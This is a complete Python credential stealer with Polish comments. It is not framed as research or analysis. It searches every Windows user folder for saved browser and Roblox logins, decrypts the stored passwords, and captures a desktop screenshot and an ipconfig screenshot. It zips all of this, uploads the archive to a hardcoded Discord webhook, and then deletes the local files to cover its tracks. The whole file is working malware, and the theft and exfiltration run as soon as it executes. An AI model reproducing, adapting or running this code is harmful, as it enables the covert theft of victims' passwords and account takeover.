import os
import zipfile
import requests
import pyautogui
import subprocess
import sqlite3
import base64
import json
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# URL webhooków
webhook_url_1 = "https://discord.com/api/webhooks/1322292531374854224/Fdl-C9RgDUxDtK2bFQXPpRx5G_jGHjy2cNJ-k7_4O4kUAIfJaIZLOTz2JUSLon5QBOGe"

# Ścieżka do katalogu z użytkownikami
users_directory = r"C:\Users"

# Lista folderów aplikacji
login_data_paths = {
    "Opera GX": r"AppData\Roaming\Opera Software\Opera GX Stable\Login Data",
    "Google Chrome": r"AppData\Local\Google\Chrome\User Data\Default\Login Data",
    "Microsoft Edge": r"AppData\Local\Microsoft\Edge\User Data\Default\Login Data",
    "Roblox": r"AppData\Local\Roblox\user_data\Login Data"
}

# Funkcja do rozszyfrowywania haseł z Login Data
def decrypt_password(ciphertext, key):
    try:
        # Wydobycie inicjalizacji wektora (IV) z danych zaszyfrowanych
        iv = ciphertext[3:15]
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        password = decryptor.update(ciphertext[15:]) + decryptor.finalize()
        return password.decode('utf-8')
    except Exception as e:
        print(f"Nie udało się odszyfrować hasła: {e}")
        return None

# Funkcja do pobierania klucza szyfrującego
def get_key(app_name):
    if app_name == "Opera GX":
        local_state_path = os.path.expanduser("~") + "\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local State"
    elif app_name == "Google Chrome":
        local_state_path = os.path.expanduser("~") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
    elif app_name == "Microsoft Edge":
        local_state_path = os.path.expanduser("~") + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State"
    
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
        key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
        return key

# Funkcja do odczytu danych logowania z bazy SQLite
def extract_login_data(app_name):
    login_data_path = ""
    
    if app_name == "Opera GX":
        login_data_path = os.path.expanduser("~") + "\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Login Data"
    elif app_name == "Google Chrome":
        login_data_path = os.path.expanduser("~") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
    elif app_name == "Microsoft Edge":
        login_data_path = os.path.expanduser("~") + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data"
    
    conn = sqlite3.connect(login_data_path)
    cursor = conn.cursor()

    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    login_data = []

    key = get_key(app_name)

    for row in cursor.fetchall():
        origin_url = row[0]
        username = row[1]
        encrypted_password = row[2]
        password = decrypt_password(encrypted_password, key)

        if password:
            login_data.append(f"URL: {origin_url}\nUsername: {username}\nPassword: {password}\n\n")

    conn.close()
    return login_data

# Funkcja do wysyłania pliku na Discord
def send_file_to_discord(file_path, webhook_url):
    try:
        with open(file_path, "rb") as file:
            response = requests.post(
                webhook_url,
                files={"file": file},
                data={"content": f"Plik wysłany z {file_path}!"}
            )
        if response.status_code == 200:
            print(f"Plik {file_path} wysłany na Discord.")
        else:
            print(f"Błąd przy wysyłaniu {file_path}: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"Błąd przy otwieraniu pliku {file_path}: {e}")

# Funkcja do robienia zrzutu ekranu
def take_screenshot(save_path):
    try:
        screenshot = pyautogui.screenshot()
        screenshot.save(save_path)  # Zapisywanie z rozszerzeniem .png
        print(f"Zrzut ekranu zapisany w {save_path}")
        return save_path
    except Exception as e:
        print(f"Błąd przy robieniu zrzutu ekranu: {e}")
        return None

# Funkcja do tworzenia pliku ZIP z unikalnymi nazwami plików
def create_zip_from_files(file_paths, zip_file_name):
    with zipfile.ZipFile(zip_file_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for file in file_paths:
            if os.path.exists(file):
                file_name = os.path.basename(file)  # Nazwa pliku bez ścieżki
                # Dodanie nazwy aplikacji do nazwy pliku, jeśli to Login Data
                if "Login Data" in file_name:
                    app_name = file.split("\\")[-3]  # Nazwa aplikacji (np. "Opera GX")
                    file_name = f"{app_name}_{file_name}"  # Dodajemy aplikację do nazwy pliku
                zipf.write(file, file_name)
                print(f"Dodano plik do ZIP-a: {file}")
            else:
                print(f"Plik nie istnieje i nie został dodany do ZIP-a: {file}")
    print(f"Pliki spakowane do {zip_file_name}")

# Funkcja do przeszukiwania folderów użytkowników i zbierania plików Login Data
def collect_login_data():
    files_to_zip = []
    for username in os.listdir(users_directory):
        user_folder = os.path.join(users_directory, username)
        if os.path.isdir(user_folder) and username not in ["Default", "Default User", "All Users", "Public"]:
            for app_name in login_data_paths.keys():
                login_data_path = os.path.join(user_folder, login_data_paths[app_name])
                if os.path.exists(login_data_path):
                    print(f"Znaleziono plik Login Data w {app_name} dla użytkownika {username}.")
                    files_to_zip.append(login_data_path)
                    
                    # Extract and save the login data
                    login_data = extract_login_data(app_name)
                    login_data_filename = f"{app_name}_login_data.txt"
                    with open(login_data_filename, "w", encoding="utf-8") as f:
                        for entry in login_data:
                            f.write(entry)
                    files_to_zip.append(login_data_filename)
                else:
                    print(f"Nie znaleziono pliku Login Data w {app_name} dla użytkownika {username}.")
    return files_to_zip

# Funkcja do robienia zrzutu ekranu z polecenia `ipconfig`
def take_ipconfig_screenshot():
    try:
        subprocess.run("ipconfig", shell=True, check=True)
        screenshot_path_ipconfig = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'ipconfig_screenshot.png')
        screenshot_ipconfig = pyautogui.screenshot()
        screenshot_ipconfig.save(screenshot_path_ipconfig)  # Zapisywanie pliku .png
        print(f"Zrzut ekranu ipconfig zapisany w {screenshot_path_ipconfig}")
        return screenshot_path_ipconfig
    except Exception as e:
        print(f"Błąd przy robieniu zrzutu ekranu ipconfig: {e}")
        return None

# Funkcja główna
def create_zip_with_screenshots_and_data():
    files_to_zip = collect_login_data()

    # Zrzut ekranu pulpitu
    screenshot_path = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'screenshot.png')
    screenshot_file = take_screenshot(screenshot_path)
    if screenshot_file:
        files_to_zip.append(screenshot_file)

    # Zrzut ekranu ipconfig
    ipconfig_screenshot_file = take_ipconfig_screenshot()
    if ipconfig_screenshot_file:
        files_to_zip.append(ipconfig_screenshot_file)

    # Tworzenie ZIP-a
    zip_file_name = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'Complete_Archive.zip')
    create_zip_from_files(files_to_zip, zip_file_name)

    # Wysyłanie ZIP-a na Discord
    send_file_to_discord(zip_file_name, webhook_url_1)

    # Usuwanie plików tymczasowych
    try:
        os.remove(zip_file_name)
        print(f"Plik {zip_file_name} został usunięty po wysłaniu.")
        for file in files_to_zip:
            if os.path.exists(file):
                os.remove(file)
                print(f"Plik tymczasowy {file} został usunięty.")
    except Exception as e:
        print(f"Błąd przy usuwaniu plików: {e}")

# Uruchomienie funkcji
create_zip_with_screenshots_and_data()
